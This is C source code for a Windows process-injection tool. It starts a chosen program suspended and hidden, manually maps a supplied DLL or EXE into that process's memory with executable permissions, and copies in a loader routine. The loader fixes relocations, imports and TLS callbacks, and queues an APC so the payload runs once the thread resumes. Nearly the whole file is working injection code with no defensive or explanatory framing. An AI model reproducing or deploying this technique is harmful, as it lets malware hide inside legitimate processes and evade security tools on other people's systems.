#include<stdio.h>
#include<windows.h>
#include<winternl.h>
#include<Ntstatus.h>
typedef LPVOID WINAPI (*Load_Dll)(LPSTR );
typedef UINT_PTR WINAPI (*Get_Func)(LPVOID , LPSTR );




typedef struct _PE_INFO
{
	BOOL Is_Require_Base_Relocation;
	LPVOID base;
	Load_Dll __LoadLibrary;
	Get_Func __GetProcAddress;
}PE_INFO , * LPE_INFO ;

#ifdef _WIN64
#define BASE_REL_TYPE 10
#else
#define BASE_REL_TYPE 3
#endif

LPVOID Memory_Map_File(const char * Filename)
{
	HANDLE f,mmap;
	
	
	if((f=CreateFileA(Filename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL))==INVALID_HANDLE_VALUE)
	{
		printf("[-]Failed To Open File");
		return NULL;
	}
	
	if((mmap=CreateFileMappingA(f,NULL,PAGE_READONLY,0,0,NULL))==NULL)
	{
		printf("[-]CreateFileMappingA() Failed..");
		return NULL;
	}
	
	return MapViewOfFile(mmap,FILE_MAP_READ,0,0,0);
}


void Adjust_PE(LPE_INFO pe)
{
	PIMAGE_DOS_HEADER dos;
	PIMAGE_NT_HEADERS nt;
	PIMAGE_BASE_RELOCATION reloc;
	PIMAGE_IMPORT_DESCRIPTOR import;
	PIMAGE_THUNK_DATA Othunk,Fthunk;
	PIMAGE_TLS_DIRECTORY tls;
	PIMAGE_TLS_CALLBACK * TLS_CALL;
	LPVOID base;
	
	
	base=pe->base;dos=(PIMAGE_DOS_HEADER)base;nt=(PIMAGE_NT_HEADERS)(base+dos->e_lfanew);
	
	if(!pe->Is_Require_Base_Relocation)
	goto Load_Import;
	
	Base_Reloc:
		if(!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
		goto Load_Import;
		
		reloc=(PIMAGE_BASE_RELOCATION)(base+nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		UINT_PTR delta=(UINT_PTR)base-(UINT_PTR)nt->OptionalHeader.ImageBase;
		while(reloc->VirtualAddress)
		{
			LPVOID Dest=base+reloc->VirtualAddress;
			int Entry=(reloc->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;
			PWORD data=(PWORD)((LPVOID)reloc+sizeof(IMAGE_BASE_RELOCATION));
			int i;
			for(i=0;i<Entry;i++,data++)
			{
				if(((*data)>>12)==BASE_REL_TYPE)
				{
					UINT_PTR * p=(UINT_PTR *)(Dest+((*data)&0xfff));
					*p+=delta;
				}
			}
			
			reloc=(PIMAGE_BASE_RELOCATION)((LPVOID)reloc+reloc->SizeOfBlock);
		}
		
	Load_Import:
		if(!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
		goto TLS;
		
		import=(PIMAGE_IMPORT_DESCRIPTOR)(base+nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		while(import->Name)
		{
			LPVOID dll=pe->__LoadLibrary(base+import->Name);
			Othunk=(PIMAGE_THUNK_DATA)(base+import->OriginalFirstThunk);
			Fthunk=(PIMAGE_THUNK_DATA)(base+import->FirstThunk);
			if(!import->OriginalFirstThunk)
			Othunk=Fthunk;
			
			while(Othunk->u1.AddressOfData)
			{
				if(Othunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				{
					*(UINT_PTR *)Fthunk=pe->__GetProcAddress(dll,(LPSTR)IMAGE_ORDINAL(Othunk->u1.Ordinal));
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME nm=(PIMAGE_IMPORT_BY_NAME)(base+Othunk->u1.AddressOfData);
					*(UINT_PTR *)Fthunk=pe->__GetProcAddress(dll,nm->Name);
				}
				Othunk++;
				Fthunk++;
			}
			import++;
		}
		
	
	TLS:
		if(!nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress)
		goto Execute_Entry;
		tls=(PIMAGE_TLS_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
		if(!tls->AddressOfCallBacks)
		goto Execute_Entry;
		
		TLS_CALL=(PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
		while(*TLS_CALL)
		{
			(*TLS_CALL)(base,1,NULL);TLS_CALL++;
		}
	
	Execute_Entry:
		if((nt->FileHeader.Characteristics & 0x2000)==0x2000)
		{
			void (*entry)(LPVOID , DWORD ,LPVOID);
			entry=base+nt->OptionalHeader.AddressOfEntryPoint;
			(*entry)(base,1,NULL);
		}
		else
		{
			void (*entry)();
			entry=base+nt->OptionalHeader.AddressOfEntryPoint;
			(*entry)();
		}
	
	
}

int main(int i,char *arg[])
{
	STARTUPINFOA st;
	PROCESS_INFORMATION pi;
	LPVOID base,Rbase;
	PIMAGE_DOS_HEADER dos;
	PIMAGE_NT_HEADERS nt;
	PIMAGE_SECTION_HEADER sec;
	PE_INFO pe;
	if(i!=3)
	{
		printf("[!]Usage %s <DLL> <Process>\n",arg[0]);
		return 1;
	}
	
	ZeroMemory(&pe,sizeof(pe));
	ZeroMemory(&st,sizeof(st));
	ZeroMemory(&pi,sizeof(pi));
	
	printf("[*]Openning File...\n");
	
	if((base=Memory_Map_File(arg[1]))==NULL)
	{
		printf("[-]Failed To Memory Map File");
		return 1;
	}
	
	dos=(PIMAGE_DOS_HEADER)base;
	if(dos->e_magic!=0x5a4d)
	{
		printf("[-]Invalid File");
		return 1;
	}
	
	nt=(PIMAGE_NT_HEADERS)(base+dos->e_lfanew);
	if(nt->OptionalHeader.Magic!=IMAGE_NT_OPTIONAL_HDR_MAGIC)
	{
		printf("[-]Please Provide Appropiate Architecture based PE");
		return 1;
	}
	
	sec=(PIMAGE_SECTION_HEADER)((LPVOID)nt+sizeof(IMAGE_NT_HEADERS));
	printf("[+]Creating Process In Suspended Process\n");
	
	
	st.cb=sizeof(st);
	
	if(!CreateProcessA(NULL,arg[2],NULL,NULL,0,CREATE_SUSPENDED | CREATE_NO_WINDOW,NULL,NULL,&st,&pi))
	{
		printf("[-]Failed To Create Process");
		return 1;
	}
	printf("[+]Process Is Created -> Process ID = %d -- Thread ID = %d\n",pi.dwProcessId,pi.dwThreadId);

	if((Rbase=VirtualAllocEx(pi.hProcess,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
	{
		pe.Is_Require_Base_Relocation=1;
		if((Rbase=VirtualAllocEx(pi.hProcess,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
		{
			printf("[-]Failed To Allocate Memory");
			return 1;
		}
	}
	printf("[+]Memory Allocated At %p\n",Rbase);
	printf("[+]Writing Headers -> %d bytes\n",nt->OptionalHeader.SizeOfHeaders);
	
	WriteProcessMemory(pi.hProcess,Rbase,base,nt->OptionalHeader.SizeOfHeaders,NULL);
	for(i=0;i<nt->FileHeader.NumberOfSections;i++,sec++)
	{
		printf("[+]Copying Section : \'%s\' -> %d bytes\n",sec->Name,sec->SizeOfRawData);
		WriteProcessMemory(pi.hProcess,Rbase+sec->VirtualAddress,base+sec->PointerToRawData,sec->SizeOfRawData,NULL);
	}
	
	pe.base=Rbase;
	pe.__GetProcAddress=GetProcAddress;
	pe.__LoadLibrary=LoadLibraryA;
	

	

	
	ULONG len=(UINT_PTR)main-(UINT_PTR)Adjust_PE;
	LPVOID temp;
	
	if((temp=VirtualAllocEx(pi.hProcess,NULL,len+sizeof(pe),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE))==NULL)
	{
		printf("[-]Failed To Allocate Memory\n");
		TerminateProcess(pi.hProcess,1);
		return 1;
	}
	
	WriteProcessMemory(pi.hProcess,temp,&pe,sizeof(pe),NULL);
	WriteProcessMemory(pi.hProcess,temp+sizeof(pe),Adjust_PE,len,NULL);
	
	
	
	if(!QueueUserAPC(temp+sizeof(pe),pi.hThread,(UINT_PTR)temp))
	{
		printf("[-]QueueUserAPC() Failed\n");
		TerminateThread(pi.hProcess,1);
		return 1;
	}
	if((nt->FileHeader.Characteristics & 0x2000)==0x2000)
	{
		printf("\n[!]File Is Dll\n");
	}
	else
	{
		printf("\n[!]File Is Exe\n");
	}
	
	printf("[+]Resuming Thread....");
	ResumeThread(pi.hThread);
	

	return 0;
	
	
	
}



